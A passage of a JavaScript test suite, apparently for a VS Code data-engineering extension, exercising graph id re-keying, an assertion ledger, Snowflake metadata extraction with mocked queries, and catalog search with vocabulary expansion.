    assert.deepStrictEqual(mssql.nodes.filter((n) => n.type === 'column').map((c) => `${c.label} ${c.dataType} ${c.isNullable}`), ['Id INT false', 'Memo NVARCHAR true'], '-1 (MAX) length is not rendered');
    assert.strictEqual(parseCsv('a,b\n1,2\n', '/x/plain.csv').tableCount, 1, 'an ordinary CSV is still a data file');
  });

  await test('v0.31.0: re-keying legacy ids is pure, idempotent and graph-equivalent apart from ids', () => {
    const { rekeyLegacyGraph } = require('../dist/engine/context/estate.js');
    const fileO = { source: 'derived', sourceRef: '/data/shop.ddl', extractor: 'file-ingestion' };
    const live = { source: 'derived', sourceRef: 'snowflake', connectionId: 'snowflake:acme', reliability: 'live-verified' };
    const legacy = {
      nodes: [
        { id: 'table-shop_orders', type: 'table', label: 'orders', fqn: 'shop.orders', database: 'ingested_files', schema: 'shop', isView: false, metadata: {}, version: 1, origin: fileO },
        { id: 'col-shop_orders.order_id', type: 'column', label: 'order_id', dataType: 'INT', isNullable: false, isPrimaryKey: true, isForeignKey: false, metadata: {}, version: 1, origin: fileO },
        { id: 'table-DB_PUBLIC_ORDERS', type: 'table', label: 'ORDERS', fqn: 'DB.PUBLIC.ORDERS', database: 'DB', schema: 'PUBLIC', isView: false, metadata: {}, version: 1, origin: live },
        { id: 'biz-term-revenue', type: 'business_term', label: 'Revenue', formula: 'SUM(x)', mappedNodeIds: [], metadata: {}, version: 1 },
        { id: 'biz-rule-1', type: 'business_rule', label: 'PII', ruleText: 'Email must be masked always', enforcementLevel: 'STRICT', metadata: {}, version: 1 },
        { id: 'spec-term-bps-1-obj0', type: 'business_term', label: 'Grow revenue', mappedNodeIds: [], metadata: {}, version: 1, origin: { source: 'derived', sourceRef: 'spec:bps-1', specId: 'bps-1' } }
      ],
      edges: [
        { id: 'edge-contains-table-shop_orders-col-shop_orders.order_id', source: 'table-shop_orders', target: 'col-shop_orders.order_id', type: 'contains' },
        { id: 'edge-maps-biz-term-revenue-table-shop_orders', source: 'biz-term-revenue', target: 'table-shop_orders', type: 'maps_to' }
      ]
    };
    const identityOf = (o) => o && o.connectionId ? { system: 'acme', environment: 'prod' } : o && o.sourceRef && /\.ddl$/.test(o.sourceRef) ? { system: 'shop', environment: 'default' } : { system: 'unassigned', environment: 'default' };
    const r = rekeyLegacyGraph(legacy, identityOf);
    assert.deepStrictEqual(r.nodes.map((n) => n.id), ['obj:shop/default/shop.orders', 'obj:shop/default/shop.orders.order_id', 'obj:acme/prod/db.public.orders', 'term:revenue', 'rule:email-must-be-masked-always', 'term:spec.bps-1.obj0']);
    assert.deepStrictEqual(r.edges.map((e) => [e.id, e.source, e.target]), [
      ['edge:contains:obj:shop/default/shop.orders->obj:shop/default/shop.orders.order_id', 'obj:shop/default/shop.orders', 'obj:shop/default/shop.orders.order_id'],
      ['edge:maps_to:term:revenue->obj:shop/default/shop.orders', 'term:revenue', 'obj:shop/default/shop.orders']
    ]);
    assert.strictEqual(r.aliases.get('table-shop_orders'), 'obj:shop/default/shop.orders');
    assert.strictEqual(r.aliases.size, 8, '6 nodes + 2 edges');
    assert.deepStrictEqual([r.nodes[2].origin.system, r.nodes[2].origin.systemEnvironment], ['acme', 'prod']);
    const strip = (n) => { const c = JSON.parse(JSON.stringify(n)); delete c.id; delete c.source; delete c.target; if (c.origin) { delete c.origin.system; delete c.origin.systemEnvironment; } return c; };
    assert.deepStrictEqual(r.nodes.map(strip), legacy.nodes.map(strip), 'equivalent apart from ids');
    const again = rekeyLegacyGraph({ nodes: r.nodes, edges: r.edges }, identityOf);
    assert.strictEqual(again.aliases.size, 0, 'idempotent');
  });

  await test('v0.31.0: a re-keying supersedes mirrors as "re-keyed" — no retraction, no review flags — and old subjects resolve through the ledger\'s alias map (also after compaction)', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const p = require('node:path');
    const { AssertionLedger } = require('../dist/engine/context/ledger.js');
    const { syncGraphToLedger, projectGraph } = require('../dist/engine/context/projection.js');
    const { rekeyLegacyGraph } = require('../dist/engine/context/estate.js');
    const root = nodeFs.mkdtempSync(p.join(os.tmpdir(), 'autode-k1-'));
    try {
      const fileO = { source: 'derived', sourceRef: '/data/shop.ddl' };
      const legacy = {
        nodes: [
          { id: 'table-shop_orders', type: 'table', label: 'orders', fqn: 'shop.orders', database: 'x', schema: 'shop', isView: false, metadata: {}, version: 1, origin: fileO },
          { id: 'col-shop_orders.order_id', type: 'column', label: 'order_id', dataType: 'INT', isNullable: false, isPrimaryKey: true, isForeignKey: false, metadata: {}, version: 1, origin: fileO }
        ],
        edges: [{ id: 'edge-contains-table-shop_orders-col-shop_orders.order_id', source: 'table-shop_orders', target: 'col-shop_orders.order_id', type: 'contains' }]
      };
      const ledger = new AssertionLedger(p.join(root, 'ledger'));
      await syncGraphToLedger(ledger, legacy);
      const key = await ledger.assert({ kind: 'key', subject: ['table-shop_orders'], predicate: 'primary', value: ['order_id'], statement: 'order_id is the key', evidence: [{ type: 'chat_message', ref: 't3' }], status: 'active', trust: 'confirmed' });

      const r = rekeyLegacyGraph(legacy, () => ({ system: 'shop', environment: 'default' }));
      await ledger.append(ledger.buildAliasEvents(r.aliases));
      const sync = await syncGraphToLedger(ledger, { nodes: r.nodes, edges: r.edges }, { aliases: r.aliases });
      assert.deepStrictEqual([sync.rekeyed, sync.asserted, sync.superseded, sync.retracted, sync.dependentsFlagged], [3, 0, 0, 0, 0]);
      assert.deepStrictEqual(ledger.get(key.id).subject, ['obj:shop/default/shop.orders'], 'the key assertion now points at the new id');
      assert.strictEqual(ledger.get(key.id).status, 'active', 'and was not sent to review');
      const projected = projectGraph(ledger.assertions());
      assert.deepStrictEqual(projected.nodes.map((n) => n.id).sort(), ['obj:shop/default/shop.orders', 'obj:shop/default/shop.orders.order_id']);
      assert.strictEqual((await syncGraphToLedger(ledger, projected, { aliases: r.aliases })).events, 0, 'idempotent');
      assert.strictEqual(ledger.buildAliasEvents(r.aliases).length, 0, 'aliases are recorded once');

      await ledger.compact({ prune: true });
      const reread = new AssertionLedger(p.join(root, 'ledger'));
      await reread.load();
      assert.strictEqual(reread.aliases().get('table-shop_orders'), 'obj:shop/default/shop.orders', 'compaction keeps the alias map');
      assert.deepStrictEqual(reread.get(key.id).subject, ['obj:shop/default/shop.orders']);
    } finally {
      nodeFs.rmSync(root, { recursive: true, force: true });
    }
  });

  await test('v0.31.0: ContextFileManager migrates a pre-K1 workspace in place — no assertion lost, old ids still resolve, estate.yaml written, second load appends nothing', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const p = require('node:path');
    const dir = nodeFs.mkdtempSync(p.join(os.tmpdir(), 'autode-k1-cfm-'));
    const ctx = p.join(dir, '.autode');
    try {
      // A v0.30.0 workspace: a ledger holding legacy-id mirrors and a key assertion about one of them.
      const { AssertionLedger } = require('../dist/engine/context/ledger.js');
      const { syncGraphToLedger } = require('../dist/engine/context/projection.js');
      const fileO = { source: 'derived', sourceRef: '/data/shop.ddl', extractor: 'file-ingestion', reliability: 'best-effort-inferred' };
      const old = new AssertionLedger(p.join(ctx, 'knowledge', 'ledger'));
      await syncGraphToLedger(old, { nodes: [{ id: 'table-shop_orders', type: 'table', label: 'orders', fqn: 'shop.orders', database: 'ingested_files', schema: 'shop', isView: false, metadata: {}, version: 1, origin: fileO }], edges: [] });
      const key = await old.assert({ kind: 'key', subject: ['table-shop_orders'], predicate: 'primary', value: ['order_id'], statement: 'order_id is the key', evidence: [{ type: 'chat_message', ref: 't3' }], status: 'active', trust: 'confirmed' });
      const mock = {
        Uri: { file: (x) => ({ fsPath: x }), joinPath: (...parts) => ({ fsPath: parts.map((x) => (x && x.fsPath) ? x.fsPath : String(x)).join('/') }) },
        workspace: { fs: { createDirectory: async () => {} }, createFileSystemWatcher: () => ({ onDidChange: () => {}, onDidCreate: () => {}, onDidDelete: () => {}, dispose: () => {} }) },
        RelativePattern: class {}
      };
      delete require.cache[require.resolve('../dist/context/ContextFileManager.js')];
      delete require.cache[require.resolve('../dist/context/GraphManager.js')];
      const { ContextFileManager } = withMock(mock, () => require('../dist/context/ContextFileManager.js'));
      const { GraphManager } = withMock(mock, () => require('../dist/context/GraphManager.js'));
      const graph = new GraphManager();
      const cfm = new ContextFileManager({ fsPath: dir }, graph, () => {});
      await cfm.initialize();
      assert.deepStrictEqual(graph.getNodesByType('table').map((t) => t.id), ['obj:shop/default/shop.orders']);
      assert.strictEqual(graph.getNodeById('table-shop_orders').id, 'obj:shop/default/shop.orders', 'old ids still resolve (mapping contexts hold them)');
      const ledger = cfm.getLedger();
      assert.deepStrictEqual([ledger.get(key.id).status, ledger.get(key.id).subject], ['active', ['obj:shop/default/shop.orders']]);
      assert.ok(!ledger.assertions().some((a) => a.status === 'rejected'), 'nothing retracted by the migration');
      assert.ok(/system: shop/.test(nodeFs.readFileSync(p.join(ctx, 'knowledge', 'estate.yaml'), 'utf8')), 'the file-derived system is recorded in estate.yaml');
      const events = ledger.allEvents().length;
      const graph2 = new GraphManager();
      const cfm2 = new ContextFileManager({ fsPath: dir }, graph2, () => {});
      await cfm2.initialize();
      assert.strictEqual(cfm2.getLedger().allEvents().length, events, 'a second load appends nothing');
    } finally {
      nodeFs.rmSync(dir, { recursive: true, force: true });
    }
  });

  await test('v0.31.0: extracting a second schema of the same connection does not retract the first; re-extracting a schema replaces only it', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const p = require('node:path');
    const dir = nodeFs.mkdtempSync(p.join(os.tmpdir(), 'autode-k1-merge-'));
    const ctx = p.join(dir, '.autode');
    nodeFs.mkdirSync(p.join(ctx, 'local'), { recursive: true });
    const mock = {
      Uri: { file: (x) => ({ fsPath: x }), joinPath: (...parts) => ({ fsPath: parts.map((x) => (x && x.fsPath) ? x.fsPath : String(x)).join('/') }) },
      workspace: { fs: { createDirectory: async () => {} }, createFileSystemWatcher: () => ({ onDidChange: () => {}, onDidCreate: () => {}, onDidDelete: () => {}, dispose: () => {} }) },
      RelativePattern: class {}
    };
    delete require.cache[require.resolve('../dist/context/ContextFileManager.js')];
    delete require.cache[require.resolve('../dist/context/GraphManager.js')];
    const { ContextFileManager } = withMock(mock, () => require('../dist/context/ContextFileManager.js'));
    const { GraphManager } = withMock(mock, () => require('../dist/context/GraphManager.js'));
    const { SnowflakeAdapter } = require('../dist/engine/platform/adapters/SnowflakeAdapter.js');
    const adapter = new SnowflakeAdapter({ account: 'acme', username: 'u' }, () => {});
    const extraction = (schema, tables) => adapter.snapshotToGraph({ platform: 'snowflake', connectionId: 'snowflake:acme', extractedAt: '2026-10-15T00:00:00Z', views: [], foreignKeys: [],
      tables: tables.map((t) => ({ catalog: 'SALES', schema, name: t, fqn: `SALES.${schema}.${t}`, type: 'BASE TABLE', columns: [{ name: 'ID', dataType: 'NUMBER', isNullable: false, isPrimaryKey: true, isForeignKey: false, ordinalPosition: 1 }] })) }, { system: 'shop', environment: 'prod', role: 'source' });
    const write = async (g) => {
      const f = p.join(ctx, 'local', 'schema-graph.json');
      nodeFs.writeFileSync(f, JSON.stringify(g));
      const future = new Date(Date.now() + 60000 + Math.random() * 1000);
      nodeFs.utimesSync(f, future, future);
      const graph = new GraphManager();
      const cfm = new ContextFileManager({ fsPath: dir }, graph, () => {});
      await cfm.initialize();
      return { graph, cfm };
    };
    try {
      await write(extraction('PUBLIC', ['ORDERS', 'CUSTOMERS']));
      const { graph, cfm } = await write(extraction('FINANCE', ['INVOICES']));
      assert.deepStrictEqual(graph.getNodesByType('table').map((t) => t.id).sort(), ['obj:shop/prod/sales.finance.invoices', 'obj:shop/prod/sales.public.customers', 'obj:shop/prod/sales.public.orders']);
      assert.ok(!cfm.getLedger().assertions().some((a) => a.status === 'rejected'), 'nothing retracted');
      const third = await write(extraction('PUBLIC', ['ORDERS']));
      assert.deepStrictEqual(third.graph.getNodesByType('table').map((t) => t.id).sort(), ['obj:shop/prod/sales.finance.invoices', 'obj:shop/prod/sales.public.orders'], 'CUSTOMERS was dropped from PUBLIC; FINANCE is untouched');
      const gone = third.cfm.getLedger().assertions().find((a) => a.predicate === 'node' && a.value.node.id === 'obj:shop/prod/sales.public.customers');
      assert.strictEqual(gone.status, 'rejected');
    } finally {
      nodeFs.rmSync(dir, { recursive: true, force: true });
    }
  });

  await test('v0.31.0: extractMetadata() extracts every schema in schemaFilter (lineage once) and ConnectionManager applies the estate binding\'s schemas and identity', async () => {
    const { SnowflakeAdapter } = require('../dist/engine/platform/adapters/SnowflakeAdapter.js');
    const adapter = new SnowflakeAdapter({ account: 'acme', username: 'u', database: 'SALES' }, () => {});
    const seen = [];
    adapter.connectedDb = 'SALES';
    adapter.executeQuery = async (sql) => {
      seen.push(sql);
      const m = /table_schema = '([A-Z_]+)'/i.exec(sql);
      if (/INFORMATION_SCHEMA\.TABLES/i.test(sql)) return { columns: [], rows: [{ TABLE_CATALOG: 'SALES', TABLE_SCHEMA: m[1], TABLE_NAME: `T_${m[1]}`, TABLE_TYPE: 'BASE TABLE' }], rowCount: 1, executionTimeMs: 0 };
      if (/INFORMATION_SCHEMA\.COLUMNS/i.test(sql)) return { columns: [], rows: [{ TABLE_CATALOG: 'SALES', TABLE_SCHEMA: m[1], TABLE_NAME: `T_${m[1]}`, COLUMN_NAME: 'ID', DATA_TYPE: 'NUMBER', IS_NULLABLE: 'NO', ORDINAL_POSITION: 1 }], rowCount: 1, executionTimeMs: 0 };
      return { columns: [], rows: [], rowCount: 0, executionTimeMs: 0 };
    };
    adapter.getCapabilities = () => ({ supportsColumnProfiling: false, supportsLineageExtraction: true });
    const snap = await adapter.extractMetadata({ schemaFilter: ['PUBLIC', 'SALES.FINANCE'] });
    assert.deepStrictEqual(snap.tables.map((t) => t.fqn).sort(), ['SALES.FINANCE.T_FINANCE', 'SALES.PUBLIC.T_PUBLIC']);
    assert.strictEqual(seen.filter((q) => /QUERY_HISTORY/i.test(q)).length, 1, 'account-wide lineage is read once');

    const { ConnectionManager } = require('../dist/engine/platform/ConnectionManager.js');
    const cm = new ConnectionManager(() => {});
    cm.activeAdapter = adapter;
    let asked;
    cm.setEstateResolver((id) => { asked = id; return { identity: { system: 'shop', environment: 'prod', role: 'source' }, schemas: ['PUBLIC'] }; });
    seen.length = 0;
    const bound = await cm.extractMetadata({});
    assert.strictEqual(asked, 'snowflake:acme');
    assert.deepStrictEqual(bound.tables.map((t) => t.schema), ['PUBLIC'], 'the binding\'s schemas are extracted when the caller names none');
    const g = adapter.snapshotToGraph(bound, cm.activeIdentity());
    assert.strictEqual(g.nodes[0].id, 'obj:shop/prod/sales.public.t_public');
  });

  await test('v0.31.0: manifests pin catalog revisions per system/environment, and objects the approved Pipeline Spec plans count as known', () => {
    const { catalogWatermarks } = require('../dist/engine/context/estate.js');
    const { buildGroundingManifest } = require('../dist/engine/grounding/manifest.js');
    const { buildSchemaIndex } = require('../dist/engine/grounding/sqlGrounding.js');
    const { parseDdl } = fresh('../dist/engine/context/fileIngestion.js');
    const g = parseDdl('CREATE TABLE shop.orders (order_id INT PRIMARY KEY);', '/x/shop.ddl', { system: 'shop', environment: 'prod' });
    const rev = catalogWatermarks(g.nodes);
    assert.deepStrictEqual(Object.keys(rev), ['shop/prod']);
    assert.ok(/^\d{4}-/.test(rev['shop/prod']));
    const m = buildGroundingManifest({
      artifact: { path: 'x.sql', content: 'INSERT INTO marts.fct_orders SELECT o.order_id FROM shop.orders o JOIN marts.dim_customer c ON 1=1', language: 'sql', agent: 'a' },
      primitiveUses: [], graph: g, schemaIndex: buildSchemaIndex(g.nodes, g.edges), assertions: [], catalogRevisions: rev, plannedObjects: ['MARTS.DIM_CUSTOMER']
    });
    assert.deepStrictEqual(m.catalogRevisions, rev);
    assert.deepStrictEqual(m.grounding.identifiers.unresolved, [], 'dim_customer is planned, so it is not an unresolved identifier');
  });

  await test('v0.31.0: estate.yaml edited in the editor applies to the next lookup (no reload needed)', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const p = require('node:path');
    const dir = nodeFs.mkdtempSync(p.join(os.tmpdir(), 'autode-k1-estate-'));
    try {
      const mock = {
        Uri: { file: (x) => ({ fsPath: x }), joinPath: (...parts) => ({ fsPath: parts.map((x) => (x && x.fsPath) ? x.fsPath : String(x)).join('/') }) },
        workspace: { fs: { createDirectory: async () => {} }, createFileSystemWatcher: () => ({ onDidChange: () => {}, onDidCreate: () => {}, onDidDelete: () => {}, dispose: () => {} }) },
        RelativePattern: class {}
      };
      delete require.cache[require.resolve('../dist/context/ContextFileManager.js')];
      delete require.cache[require.resolve('../dist/context/GraphManager.js')];
      const { ContextFileManager } = withMock(mock, () => require('../dist/context/ContextFileManager.js'));
      const { GraphManager } = withMock(mock, () => require('../dist/context/GraphManager.js'));
      const cfm = new ContextFileManager({ fsPath: dir }, new GraphManager(), () => {});
      await cfm.initialize();
      nodeFs.writeFileSync(p.join(dir, '.autode', 'knowledge', 'estate.yaml'), 'systems:\n  - { id: shop, name: Shop, role: source }\nbindings:\n  - { file: shop_dev.ddl, system: shop, environment: dev }\n');
      assert.deepStrictEqual(cfm.resolveFile('C:\\src\\shop_dev.ddl'), { system: 'shop', environment: 'dev', role: 'source' });
      assert.strictEqual(cfm.resolveFile('/src/other.ddl').system, 'other');
      assert.ok(/other\.ddl/.test(nodeFs.readFileSync(p.join(dir, '.autode', 'knowledge', 'estate.yaml'), 'utf8')), 'the new binding is saved, the edited ones kept');
      assert.ok(/environment: dev/.test(nodeFs.readFileSync(p.join(dir, '.autode', 'knowledge', 'estate.yaml'), 'utf8')));
    } finally {
      nodeFs.rmSync(dir, { recursive: true, force: true });
    }
  });

  // ---------- v0.32.0: Phase K2 — working-set cache and scale ----------

  const k2 = {
    async cfm(options = {}) {
      const os = require('node:os'); const nodeFs = require('node:fs'); const p = require('node:path');
      const dir = nodeFs.mkdtempSync(p.join(os.tmpdir(), 'autode-k2-'));
      nodeFs.mkdirSync(p.join(dir, '.autode', 'knowledge'), { recursive: true });
      const mock = {
        Uri: { file: (x) => ({ fsPath: x }), joinPath: (...parts) => ({ fsPath: parts.map((x) => (x && x.fsPath) ? x.fsPath : String(x)).join('/') }) },
        workspace: { fs: { createDirectory: async () => {} }, createFileSystemWatcher: () => ({ onDidChange: () => {}, onDidCreate: () => {}, onDidDelete: () => {}, dispose: () => {} }) },
        RelativePattern: class {}
      };
      delete require.cache[require.resolve('../dist/context/ContextFileManager.js')];
      delete require.cache[require.resolve('../dist/context/GraphManager.js')];
      const { ContextFileManager } = withMock(mock, () => require('../dist/context/ContextFileManager.js'));
      const { GraphManager } = withMock(mock, () => require('../dist/context/GraphManager.js'));
      const make = async () => {
        const graph = new GraphManager();
        const cfm = new ContextFileManager({ fsPath: dir }, graph, () => {});
        if (options.policy) cfm.setWorkingSetPolicy(options.policy);
        if (options.fetcher) cfm.setCatalogFetcher(options.fetcher);
        await cfm.initialize();
        return { graph, cfm };
      };
      const first = await make();
      return { dir, ...first, reload: make, cleanup: () => nodeFs.rmSync(dir, { recursive: true, force: true }) };
    },
    /** `n` tables in schema `s` of system `sys`: names t0…, two columns each. */
    ddl(s, names, extra = '') {
      return names.map((n) => `CREATE TABLE ${s}.${n} (\n  ${n}_id INTEGER NOT NULL PRIMARY KEY,\n  amount NUMBER(18,2)\n);`).join('\n') + '\n' + extra;
    },
    parsed(sys, s, names, extra) {
      const { parseDdl } = require('../dist/engine/context/fileIngestion.js');
      return parseDdl(k2.ddl(s, names, extra), `/src/${sys}.ddl`, { system: sys, environment: 'prod' });
    }
  };

  await test('v0.32.0: vocabulary reduces names and prose to shared concepts — abbreviations, synonyms, a customer file extends both', () => {
    const v = require('../dist/engine/context/vocabulary.js');
    const vocab = v.buildVocabulary();
    assert.deepStrictEqual(v.concepts('CUST_ORD_HDR', vocab), ['customer', 'order', 'header']);
    assert.deepStrictEqual(v.concepts('Which clients placed purchases?', vocab, v.ALL_SIGNALS, true), ['customer', 'placed', 'order']);
    assert.deepStrictEqual(v.concepts('custOrderLines', vocab), ['customer', 'order', 'line'], 'camel case splits too');
    assert.deepStrictEqual(v.concepts('CUST_ORD_HDR', vocab, { abbreviations: false, synonyms: true }), ['cust', 'ord', 'hdr'], 'ablation switch');
    assert.ok(v.concepts('patron rewards', vocab).includes('patron'), 'an organisation-specific word is not in the defaults');
    const file = v.parseVocabularyFile('abbreviations:\n  PTRN: patron\nsynonyms:\n  - [patron, customer]\n  - [engagement, campaign]\n');
    const custom = v.buildVocabulary(file);
    assert.deepStrictEqual(v.concepts('PTRN engagement', custom), ['customer', 'engagement'], 'patron joins the default customer group; a new group folds onto its first word');
    assert.deepStrictEqual(v.concepts('campaigns', custom), ['engagement']);
    assert.deepStrictEqual(v.parseVocabularyFile('not: [valid'), {});
  });

  await test('v0.32.0: DDL and dictionary comments are kept (COMMENT ON TABLE/COLUMN, inline COMMENT with commas) — they are a retrieval signal', () => {
    const { parseDdl, parseFile } = fresh('../dist/engine/context/fileIngestion.js');
    const r = parseDdl("CREATE TABLE EDW.CUST_MSTR (\n  CUST_NO VARCHAR(20) NOT NULL COMMENT 'Customer number, as in (legacy) CRM',\n  SEG_CD CHAR(4)\n);\nCOMMENT ON TABLE EDW.CUST_MSTR IS 'Customer master — one row per client';\nCOMMENT ON COLUMN EDW.CUST_MSTR.SEG_CD IS 'Segment code';", '/x.ddl');
    const t = r.nodes.find((n) => n.type === 'table');
    assert.strictEqual(t.description, 'Customer master — one row per client');
    assert.deepStrictEqual(r.nodes.filter((n) => n.type === 'column').map((c) => [c.label, c.dataType, c.description]), [['CUST_NO', 'VARCHAR(20)', 'Customer number, as in (legacy) CRM'], ['SEG_CD', 'CHAR(4)', 'Segment code']]);
    const csv = 'DatabaseName,TableName,ColumnName,ColumnType,ColumnLength,Nullable,ColumnId,CommentString\nEDW,ORD_HDR,ORD_NO,CV,20,N,1,Order number\n';
    const d = parseFile(csv, '/dbc.csv');
    assert.strictEqual(d.nodes.find((n) => n.type === 'column').description, 'Order number');
  });

  await test('v0.32.0: catalog search ranks by concepts over names, comments and glossary aliases; seeds are the best few within a margin', async () => {
    const { Catalog, entriesFromGraph, selectSeedHits } = require('../dist/engine/context/catalog.js');
    const { parseDdl } = require('../dist/engine/context/fileIngestion.js');
    const g = parseDdl(k2.ddl('edw', ['CUST_ORD_HDR', 'GL_JRNL_LN', 'WHSE_INVTY_SNAP', 'CUST_MSTR']) + k2.ddl('crm', ['patron_rewards']) + "COMMENT ON TABLE crm.patron_rewards IS 'Points ledger';", '/e.ddl', { system: 'edw', environment: 'prod' });
    const cat = new Catalog('/unused');
    cat.upsert(entriesFromGraph(g.nodes, g.edges));
    await cat.buildIndex();
    const top = (q, opts) => cat.search(q, opts)[0]?.id.split('/').pop();
    assert.strictEqual(top('customer order headers'), 'edw.cust_ord_hdr');
    assert.strictEqual(top('general ledger journal lines'), 'edw.gl_jrnl_ln');
    assert.strictEqual(top('points ledger'), 'crm.patron_rewards', 'table comments are indexed');
    assert.strictEqual(cat.search('customer order headers', { signals: { abbreviations: false } }).length, 0, 'without abbreviation expansion nothing matches');
    cat.setAliases(new Map([['obj:edw/prod/crm.patron_rewards', ['Loyalty Tier']]]));
    assert.strictEqual(top('loyalty tier'), 'crm.patron_rewards', 'glossary terms bound to a table are aliases');
    assert.strictEqual(cat.search('amount').length, 0, 'a column-name match alone is too weak to seed');
    const seeds = selectSeedHits(cat.search('customer'));
    assert.ok(seeds.length >= 1 && seeds.length <= 3 && seeds.every((h) => /cust/.test(h.id)));
  });

  await test('v0.32.0: an import over the working-set size is catalogued, not mirrored; a pack renders a matching table from the catalog and promotes it; a small import enters whole', async () => {
    const env = await k2.cfm({ policy: { maxTables: 5 } });
    try {
      const big = k2.parsed('edw', 'edw', ['CUST_ORD_HDR', 'GL_JRNL_LN', 'WHSE_INVTY_SNAP', 'PROD_MSTR', 'SUPP_MSTR', 'EMP_MSTR', 'INV_HDR']);
      const r = await env.cfm.ingestParsed(big.nodes, big.edges);
      assert.deepStrictEqual(r, { catalogued: 7, promoted: 0 });
      assert.strictEqual(env.graph.getNodesByType('table').length, 0);
      assert.ok(!env.cfm.getLedger().assertions().some((a) => a.predicate === 'node'), 'nothing mirrored into the ledger');
      const pack = env.cfm.buildContextPack({ purpose: 'chat', query: 'Which table holds customer order headers?' });
      assert.ok(pack.text.includes('edw.CUST_ORD_HDR') && pack.text.includes('CUST_ORD_HDR_id'), 'rendered from the catalog with its columns');
      assert.deepStrictEqual(pack.manifest.promoted, ['obj:edw/prod/edw.cust_ord_hdr']);
      assert.ok(!pack.text.includes('GL_JRNL_LN'), 'unrelated tables stay out');
      await env.cfm.whenIdle();
      assert.deepStrictEqual(env.graph.getNodesByType('table').map((t) => t.id), ['obj:edw/prod/edw.cust_ord_hdr']);
      assert.ok(env.cfm.getLedger().assertions().some((a) => a.predicate === 'node' && a.subject[0] === 'obj:edw/prod/edw.cust_ord_hdr' && a.status === 'active'));
      const small = k2.parsed('shop', 'shop', ['orders', 'customers']);
      assert.deepStrictEqual(await env.cfm.ingestParsed(small.nodes, small.edges), { catalogued: 2, promoted: 2 });
      // Catalog files: per system/environment, and ignored by git.
      const nodeFs = require('node:fs');
      assert.ok(nodeFs.existsSync(`${env.dir}/.autode/local/catalog/edw/prod/catalog.json`));
      assert.ok(/\*/.test(nodeFs.readFileSync(`${env.dir}/.autode/local/catalog/.gitignore`, 'utf8')));
      const again = await env.reload();
      assert.strictEqual(again.cfm.getCatalog().size, 9, 'the catalog survives a reload');
    } finally { env.cleanup(); }
  });

  await test('v0.32.0: tables imported after the glossary get its maps_to links, and glossary terms index catalog tables outside the working set', async () => {
    const nodeFs = require('node:fs');
    const env = await k2.cfm({ policy: { maxTables: 1 } });
    try {
      nodeFs.mkdirSync(`${env.dir}/.autode/knowledge`, { recursive: true });
      nodeFs.writeFileSync(`${env.dir}/.autode/knowledge/business-context.yaml`, 'business_terms:\n  - term: Loyalty Tier\n    description: GOLD, SILVER or BRONZE from the points balance.\n    mapped_tables: [crm.members]\n  - term: Gross Merchandise Value\n    mapped_tables: [crm.orders_hist]\n');
      const reloaded = await env.reload();
      const g = k2.parsed('crm', 'crm', ['members']);
      await reloaded.cfm.ingestParsed(g.nodes, g.edges);
      const edges = reloaded.graph.serializeSnapshot().edges.filter((e) => e.type === 'maps_to');
      assert.deepStrictEqual(edges.map((e) => `${e.source} -> ${e.target}`), ['term:loyalty-tier -> obj:crm/prod/crm.members']);
      const big = k2.parsed('crm', 'crm', ['orders_hist', 'x1', 'x2']);
      assert.strictEqual((await reloaded.cfm.ingestParsed(big.nodes, big.edges)).promoted, 0, 'over the size: catalog only');
      const hits = reloaded.cfm.getCatalog().search('gross merchandise value');
      assert.strictEqual(hits[0] && hits[0].id, 'obj:crm/prod/crm.orders_hist', 'the term indexes a table that is only in the catalog');
    } finally { env.cleanup(); }
  });

  await test('v0.32.0: offline, a name-only catalog object raises a "structure" gap; one hidden by grants is reported as not visible', async () => {
    const env = await k2.cfm();
    try {
      const cat = env.cfm.getCatalog();
      cat.upsertNames([{ id: 'obj:edw/prod/edw.cust_mstr', system: 'edw', environment: 'prod', table: { id: 'obj:edw/prod/edw.cust_mstr', type: 'table', label: 'CUST_MSTR', fqn: 'edw.CUST_MSTR', database: '', schema: 'edw', isView: false, version: 1 } },
        { id: 'obj:edw/prod/edw.cust_addr', system: 'edw', environment: 'prod', table: { id: 'obj:edw/prod/edw.cust_addr', type: 'table', label: 'CUST_ADDR', fqn: 'edw.CUST_ADDR', database: '', schema: 'edw', isView: false, version: 1 } }]);
      cat.markInvisible('obj:edw/prod/edw.cust_addr');
      await cat.buildIndex();
      const pack = env.cfm.buildContextPack({ purpose: 'chat', query: 'customer master and customer addresses' });
      const gap = pack.manifest.gaps.find((g) => g.needed === 'structure');
      assert.ok(gap && gap.subject[0] === 'obj:edw/prod/edw.cust_mstr');
      assert.ok(/not loaded/.test(pack.text), 'the gap is in the pack text');
      assert.ok(/1 object\(s\) in scope are not visible with your current grants \(edw\.CUST_ADDR\)/.test(pack.text));
      assert.ok(pack.manifest.warnings.includes('invisible:edw.CUST_ADDR'));
    } finally { env.cleanup(); }
  });

  await test('v0.32.0: query-through loads a name-only object from the live source and promotes it; one the source does not return is marked not visible', async () => {
    const fetched = [];
    const { parseDdl } = require('../dist/engine/context/fileIngestion.js');
    const fetcher = {
      covers: (system) => system === 'edw',
      fetchStructure: async (entries) => {
        fetched.push(...entries.map((e) => e.id));
        const g = parseDdl(k2.ddl('edw', ['CUST_MSTR']), '/live', { system: 'edw', environment: 'prod' });
        for (const n of g.nodes) n.origin = { ...n.origin, reliability: 'live-verified', lastVerifiedAt: new Date().toISOString() };
        return g;
      }
    };
    const env = await k2.cfm({ fetcher });
    try {
      const cat = env.cfm.getCatalog();
      const name = (n) => ({ id: `obj:edw/prod/edw.${n.toLowerCase()}`, system: 'edw', environment: 'prod', table: { id: `obj:edw/prod/edw.${n.toLowerCase()}`, type: 'table', label: n, fqn: `edw.${n}`, database: '', schema: 'edw', isView: false, version: 1 } });
      cat.upsertNames([name('CUST_MSTR'), name('CUST_MSTR_ARCH')]);
      await env.cfm.prepareContext({ purpose: 'chat', query: 'the customer master' });
      assert.ok(fetched.includes('obj:edw/prod/edw.cust_mstr'));
      assert.strictEqual(cat.get('obj:edw/prod/edw.cust_mstr').tier, 1);
      assert.ok(env.graph.getNodesByType('table').some((t) => t.id === 'obj:edw/prod/edw.cust_mstr'), 'promoted into the working set');
      assert.ok(fetched.includes('obj:edw/prod/edw.cust_mstr_arch'));
      assert.strictEqual(cat.get('obj:edw/prod/edw.cust_mstr_arch').visible, false, 'asked for, not returned: hidden by grants');
      assert.strictEqual(cat.get('obj:edw/prod/edw.cust_mstr_arch').tier, 0);
